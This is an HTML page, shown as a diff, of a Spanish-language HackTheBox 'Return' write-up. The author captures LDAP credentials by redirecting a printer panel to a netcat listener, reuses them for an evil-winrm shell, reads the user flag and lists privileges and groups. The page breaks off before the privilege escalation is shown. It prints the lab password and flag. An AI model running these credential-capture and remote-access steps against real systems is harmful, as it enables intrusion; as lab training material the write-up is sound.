@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Return (easy) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Return (easy)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/easy/2024/03/29/return.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/easy/2024/03/29/return.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-03-29T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Return (easy)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-03-29T00:00:00-06:00","datePublished":"2024-03-29T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Return (easy)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/easy/2024/03/29/return.html"},"url":"http://localhost:4000/hackthebox/machines/easy/2024/03/29/return.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Return (easy)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-03-29T00:00:00-06:00" itemprop="datePublished">
+        Mar 29, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/defa149ea7e259a4709a03a5825e970d.png" />
+</p>
+
+<ul>
+  <li>En este post vamos a estar resolviendo la maquina Return de Hackthebox donde vamos a estar enumerando primero por SMB pero no encontramos nada después por el puerto 80 que esta corriendo un servicio web encontraremos un servicio de una impresora el cual podemos modificar un campo el cual pondremos nuestra ip y nos pondremos en escucha en un puerto para que nos obtener credenciales de un usuario al igual usaremos wireshark para analizar el trafico y ver como viaja todo por detrás con las credenciales nos conectaremos con evil-wirm y para la escalada de privilegios estaremos abusando de que estamos en el grupo Server Operators y podemos para y arrancar servicios.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.129.95.241
+PING 10.129.95.241 <span class="o">(</span>10.129.95.241<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.129.95.241: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>152 ms
+
+<span class="nt">---</span> 10.129.95.241 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 152.077/152.077/152.077/0.000 ms
+❯ whichSystem.py 10.129.95.241
+
+10.129.95.241 <span class="o">(</span>ttl -&gt; 127<span class="o">)</span>: Windows
+</code></pre></div></div>
+
+<h2 id="portscan">PortScan</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49671,49674,49675,49677,49680,49697 10.129.95.241 <span class="nt">-oN</span> targeted
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-07-20 19:21 CST
+Nmap scan report <span class="k">for </span>10.129.95.241
+Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: HTB Printer Admin Panel
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-07-21 01:40:26Z<span class="o">)</span>
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: <span class="k">return</span>.local0., Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: <span class="k">return</span>.local0., Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49675/tcp open  msrpc         Microsoft Windows RPC
+49677/tcp open  msrpc         Microsoft Windows RPC
+49680/tcp open  msrpc         Microsoft Windows RPC
+49697/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: PRINTER<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+|_clock-skew: 18m32s
+| smb2-time: 
+|   <span class="nb">date</span>: 2023-07-21T01:41:23
+|_  start_date: N/A
+</code></pre></div></div>
+
+<h2 id="enumeracion">Enumeracion</h2>
+
+<ul>
+  <li>Tenemos varios puertos abiertos pero vamos a comenzar viendo a que nos estamos enfrentando.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.129.95.241
+SMB         10.129.95.241   445    PRINTER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:PRINTER<span class="o">)</span> <span class="o">(</span>domain:return.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a comenzar por <code class="language-plaintext highlighter-rouge">smb</code> primero vamos a ver si podemos ver recursos compartidos podemos hacerlo con la misma herramienta <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.129.95.241 <span class="nt">--shares</span>
+SMB         10.129.95.241   445    PRINTER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:PRINTER<span class="o">)</span> <span class="o">(</span>domain:return.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.129.95.241   445    PRINTER          <span class="o">[</span>-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED<span class="o">(</span>The remote user session has been deleted.<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Pero nada bueno podemos probar con otras herramientas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.129.95.241
+<span class="o">[</span>+] IP: 10.129.95.241:445	Name: 10.129.95.241                                     
+❯ smbclient <span class="nt">-L</span> 10.129.95.231 <span class="nt">-N</span>
+do_connect: Connection to 10.129.95.231 failed <span class="o">(</span>Error NT_STATUS_HOST_UNREACHABLE<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Pues bueno vimos que el puerto <code class="language-plaintext highlighter-rouge">80</code> esta abierto vamos a ver el contenido de lo que existe en la web.</li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">95.241</span>
+<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">95.241</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">95.241</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">PHP</span><span class="p">[</span><span class="mf">7.4</span><span class="o">.</span><span class="mi">13</span><span class="p">],</span> <span class="no">Script</span><span class="p">,</span> <span class="no">Title</span><span class="p">[</span><span class="no">HTB</span> <span class="no">Printer</span> <span class="no">Admin</span> <span class="no">Panel</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">PHP</span><span class="o">/</span><span class="mf">7.4</span><span class="o">.</span><span class="mi">13</span><span class="p">]</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Esto es lo que hay en la <code class="language-plaintext highlighter-rouge">web</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/return/web1.png" />
+</p>
+
+<ul>
+  <li>Pues como tal es una impresora si revisamos las <strong>extensiones</strong> vemos que <code class="language-plaintext highlighter-rouge">settings.php</code> encontramos un nombre de usuario.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/return/web2.png" />
+</p>
+
+<ul>
+  <li>Vamos aplicar <code class="language-plaintext highlighter-rouge">Fuzzing</code> para ver si es la única <strong>ruta</strong> interesante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ feroxbuster <span class="nt">-t</span> 200 <span class="nt">-x</span> php,txt,html <span class="nt">-u</span> http://10.129.95.241
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
+|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
+by Ben <span class="s2">"epi"</span> Risher 🤓                 ver: 2.3.3
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.129.95.241
+ 🚀  Threads               │ 200
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ <span class="o">[</span>200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
+ 💥  Timeout <span class="o">(</span>secs<span class="o">)</span>        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.3.3
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 💲  Extensions            │ <span class="o">[</span>php, txt, html]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press <span class="o">[</span>ENTER] to use the Scan Cancel Menu™
+──────────────────────────────────────────────────
+301        2l       10w      151c http://10.129.95.241/images
+301        2l       10w      151c http://10.129.95.241/Images
+200     1345l     2796w    28274c http://10.129.95.241/index.php
+200     1376l     2855w    29090c http://10.129.95.241/settings.php
+301        2l       10w      151c http://10.129.95.241/IMAGES
+200     1376l     2855w    29090c http://10.129.95.241/Settings.php
+200     1345l     2796w    28274c http://10.129.95.241/Index.php
+<span class="o">[</span><span class="c">####################] - 2m    479984/479984  0s      found:7       errors:134    </span>
+<span class="o">[</span><span class="c">####################] - 2m    119996/119996  688/s   http://10.129.95.241</span>
+<span class="o">[</span><span class="c">####################] - 2m    119996/119996  690/s   http://10.129.95.241/images</span>
+<span class="o">[</span><span class="c">####################] - 2m    119996/119996  688/s   http://10.129.95.241/Images</span>
+<span class="o">[</span><span class="c">####################] - 2m    119996/119996  708/s   http://10.129.95.241/IMAGES</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Pero bueno no vemos nada interesante si inspeccionamos la parte de <code class="language-plaintext highlighter-rouge">password</code> vemos que no solo <code class="language-plaintext highlighter-rouge">*</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/return/web3.png" />
+</p>
+
+<h2 id="ldap-credentials">LDAP Credentials</h2>
+
+<ul>
+  <li>Algo que podemos hacer es cambiar el <code class="language-plaintext highlighter-rouge">Server Address</code> a poner nuestra <code class="language-plaintext highlighter-rouge">IP</code> y estar en escucha por el puerto <code class="language-plaintext highlighter-rouge">389</code> con <code class="language-plaintext highlighter-rouge">netcat</code> para ver si recibimos algo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 389
+Listening on 0.0.0.0 389
+</code></pre></div></div>
+
+<ul>
+  <li>Al igual que podemos estar capturando trafico para analizar la captura con <code class="language-plaintext highlighter-rouge">wireshark</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tcpdump <span class="nt">-i</span> tun0 <span class="nt">-w</span> Captura.cap <span class="nt">-v</span>
+tcpdump: listening on tun0, link-type RAW <span class="o">(</span>Raw IP<span class="o">)</span>, snapshot length 262144 bytes
+Got 0
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Ahora solo le damos a <code class="language-plaintext highlighter-rouge">update</code>.</p>
+  </li>
+  <li>
+    <p>Y recibimos al parecer una contraseña.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 389
+Listening on 0.0.0.0 389
+Connection received on 10.129.95.241 55720
+0<span class="k">*</span><span class="sb">`</span>%return<span class="se">\s</span>vc-printer
+                      1edFg43012!!
+</code></pre></div></div>
+
+<ul>
+  <li>Y también recibimos trafico.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tcpdump <span class="nt">-i</span> tun0 <span class="nt">-w</span> Captura.cap <span class="nt">-v</span>
+tcpdump: listening on tun0, link-type RAW <span class="o">(</span>Raw IP<span class="o">)</span>, snapshot length 262144 bytes
+^C14 packets captured
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos abrir la captura con <code class="language-plaintext highlighter-rouge">wireshark</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wireshark <span class="nt">-r</span> Captura.cap &amp;&gt;/dev/null &amp; <span class="nb">disown</span>
+<span class="o">[</span>1] 56513
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que las credenciales son de <code class="language-plaintext highlighter-rouge">ldap</code> <code class="language-plaintext highlighter-rouge">1edFg43012!!</code> esta realizando una <code class="language-plaintext highlighter-rouge">autenticacion</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/return/web5.png" />
+</p>
+
+<ul>
+  <li>Vamos a ver si las credenciales se reutilizan y podemos ver recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.129.95.241 <span class="nt">-u</span> svc-printer <span class="nt">-p</span> <span class="s1">'1edFg43012!!'</span>
+SMB         10.129.95.241   445    PRINTER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:PRINTER<span class="o">)</span> <span class="o">(</span>domain:return.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.129.95.241   445    PRINTER          <span class="o">[</span>+] <span class="k">return</span>.local<span class="se">\s</span>vc-printer:1edFg43012!! 
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora podemos ver los recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> //10.129.95.241/ <span class="nt">-U</span> svc-printer
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\s</span>vc-printer]:
+
+	Sharename       Type      Comment
+	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
+	C<span class="nv">$ </span>             Disk      Default share
+	IPC<span class="nv">$ </span>           IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share 
+SMB1 disabled <span class="nt">--</span> no workgroup available
+</code></pre></div></div>
+
+<ul>
+  <li>Pero como tal no hay un recursos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.129.95.241 <span class="nt">-u</span> svc-printer <span class="nt">-p</span> <span class="s1">'1edFg43012!!'</span> <span class="nt">--shares</span>
+SMB         10.129.95.241   445    PRINTER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:PRINTER<span class="o">)</span> <span class="o">(</span>domain:return.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.129.95.241   445    PRINTER          <span class="o">[</span>+] <span class="k">return</span>.local<span class="se">\s</span>vc-printer:1edFg43012!! 
+SMB         10.129.95.241   445    PRINTER          <span class="o">[</span>+] Enumerated shares
+SMB         10.129.95.241   445    PRINTER          Share           Permissions     Remark
+SMB         10.129.95.241   445    PRINTER          <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.129.95.241   445    PRINTER          ADMIN<span class="nv">$ </span>         READ            Remote Admin
+SMB         10.129.95.241   445    PRINTER          C<span class="nv">$ </span>             READ,WRITE      Default share
+SMB         10.129.95.241   445    PRINTER          IPC<span class="nv">$ </span>           READ            Remote IPC
+SMB         10.129.95.241   445    PRINTER          NETLOGON        READ            Logon server share 
+SMB         10.129.95.241   445    PRINTER          SYSVOL          READ            Logon server share 
+</code></pre></div></div>
+
+<h2 id="shell-as-svc-printer">Shell as svc-printer</h2>
+
+<ul>
+  <li>Si verificamos si las credenciales se reutilizan para conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> vemos que si.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec winrm 10.129.95.241 <span class="nt">-u</span> svc-printer <span class="nt">-p</span> <span class="s1">'1edFg43012!!'</span>
+SMB         10.129.95.241   5985   PRINTER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:PRINTER<span class="o">)</span> <span class="o">(</span>domain:return.local<span class="o">)</span>
+HTTP        10.129.95.241   5985   PRINTER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.95.241:5985/wsman
+WINRM       10.129.95.241   5985   PRINTER          <span class="o">[</span>+] <span class="k">return</span>.local<span class="se">\s</span>vc-printer:1edFg43012!! <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos conectamos y estamos en la maquina victima.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ evil-winrm <span class="nt">-i</span> 10.129.95.241 <span class="nt">-u</span> svc-printer <span class="nt">-p</span> <span class="s1">'1edFg43012!!'</span>
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span><span class="k">return</span><span class="se">\s</span>vc-printer
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  <span class="nb">.</span> : .htb
+   IPv6 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : dead:beef::e8
+   IPv6 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : dead:beef::f08b:84bd:2540:f169
+   Link-local IPv6 Address <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : fe80::f08b:84bd:2540:f169%10
+   IPv4 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 10.129.95.241
+   Subnet Mask <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 255.255.0.0
+   Default Gateway <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : fe80::250:56ff:feb9:7437%10
+                                       10.129.0.1
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<ul>
+  <li>Ahora buscamos la <strong>flag</strong> y podemos verla.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
+43223ad01387c3d15f47aed81648bfaa
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+
+<ul>
+  <li>Vemos que tenemos varios privilegios entre ellos uno interesante es este <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /priv
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                         State
+<span class="o">=============================</span> <span class="o">===================================</span> <span class="o">=======</span>
+SeMachineAccountPrivilege     Add workstations to domain          Enabled
+SeLoadDriverPrivilege         Load and unload device drivers      Enabled
+SeSystemtimePrivilege         Change the system <span class="nb">time              </span>Enabled
+SeBackupPrivilege             Back up files and directories       Enabled
+SeRestorePrivilege            Restore files and directories       Enabled
+SeShutdownPrivilege           Shut down the system                Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
+SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set      </span>Enabled
+SeTimeZonePrivilege           Change the <span class="nb">time </span>zone                Enabled
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Estamos en varios grupos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /groups
+
+GROUP INFORMATION
+<span class="nt">-----------------</span>
+
+Group Name                                 Type             SID          Attributes
+<span class="o">==========================================</span> <span class="o">================</span> <span class="o">============</span> <span class="o">==================================================</span>
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN<span class="se">\S</span>erver Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
+BUILTIN<span class="se">\P</span>rint Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
+BUILTIN<span class="se">\R</span>emote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN<span class="se">\U</span>sers                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN<span class="se">\P</span>re-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\N</span>ETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\A</span>uthenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\T</span>his Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\N</span>TLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label<span class="se">\H</span>igh Mandatory Level       Label            S-1-16-12288
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Estamos en el grupo <code class="language-plaintext highlighter-rouge">server operators</code> <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators</a>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/return/web6.png" />
+</p>
+
+<ul>
+  <li>
